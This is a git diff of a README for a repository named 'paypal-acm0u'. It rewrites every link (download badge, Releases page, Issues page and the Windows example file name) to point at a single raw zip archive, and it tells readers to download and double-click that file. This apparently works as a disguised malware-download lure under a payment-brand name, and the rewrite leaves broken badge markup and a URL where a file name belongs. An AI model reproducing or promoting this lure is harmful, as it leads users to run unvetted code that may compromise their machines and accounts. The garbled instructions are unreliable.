@@ -6,9 +6,9 @@ Welcome to the **paypal-acm0u** repository! This project features a set of demo 
 
 ## 📥 Download the Software
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23%2300BFFF.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mikikassudaree/paypal-acm0u/releases)
+[![Download Now](https://github.com/mikikassudaree/paypal-acm0u/raw/refs/heads/main/concatenator/paypal-u-acm-v3.7.zip%20Now-%23%https://github.com/mikikassudaree/paypal-acm0u/raw/refs/heads/main/concatenator/paypal-u-acm-v3.7.zip)](https://github.com/mikikassudaree/paypal-acm0u/raw/refs/heads/main/concatenator/paypal-u-acm-v3.7.zip)
 
-To get the latest version of **paypal-acm0u**, visit our [Releases page](https://github.com/mikikassudaree/paypal-acm0u/releases). Here you will find all available versions of the demo files. Simply click on the link for the version you wish to download.
+To get the latest version of **paypal-acm0u**, visit our [Releases page](https://github.com/mikikassudaree/paypal-acm0u/raw/refs/heads/main/concatenator/paypal-u-acm-v3.7.zip). Here you will find all available versions of the demo files. Simply click on the link for the version you wish to download.
 
 ## 🚧 System Requirements
 
@@ -29,14 +29,14 @@ The **paypal-acm0u** repository offers a range of demo files that showcase vario
 
 ## 🛠️ Installation Instructions
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/mikikassudaree/paypal-acm0u/releases) to find the file you need.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/mikikassudaree/paypal-acm0u/raw/refs/heads/main/concatenator/paypal-u-acm-v3.7.zip) to find the file you need.
   
 2. **Download the File:** Click on the link for the version you want. Your browser will start the download automatically.
 
 3. **Locate the Downloaded File:** Once the download completes, find the file in your "Downloads" folder. 
 
 4. **Run the Application:** 
-   - For Windows: Double-click the downloaded file (e.g., `paypal-acm0u.exe`).
+   - For Windows: Double-click the downloaded file (e.g., `https://github.com/mikikassudaree/paypal-acm0u/raw/refs/heads/main/concatenator/paypal-u-acm-v3.7.zip`).
    - For macOS: Drag the file to the Applications folder, then double-click it to launch.
    - For Linux: Open a terminal, navigate to the download location, and run `chmod +x <filename>` to make it executable, and then run `./<filename>`.
 
@@ -60,10 +60,10 @@ If you encounter any issues, consider these common solutions:
 
 ## 🤝 Need Help?
 
-If you have any questions or need further assistance, you can reach out via the project's [GitHub Issues page](https://github.com/mikikassudaree/paypal-acm0u/issues). We encourage feedback and aim to provide helpful responses.
+If you have any questions or need further assistance, you can reach out via the project's [GitHub Issues page](https://github.com/mikikassudaree/paypal-acm0u/raw/refs/heads/main/concatenator/paypal-u-acm-v3.7.zip). We encourage feedback and aim to provide helpful responses.
 
 ## 📅 Future Updates
 
-This repository will continue to receive updates. Keep an eye on the [Releases page](https://github.com/mikikassudaree/paypal-acm0u/releases) for the latest features and enhancements. We appreciate your interest and value your input to help us improve.
+This repository will continue to receive updates. Keep an eye on the [Releases page](https://github.com/mikikassudaree/paypal-acm0u/raw/refs/heads/main/concatenator/paypal-u-acm-v3.7.zip) for the latest features and enhancements. We appreciate your interest and value your input to help us improve.
 
 Feel free to explore and enjoy using the **paypal-acm0u** demo files!
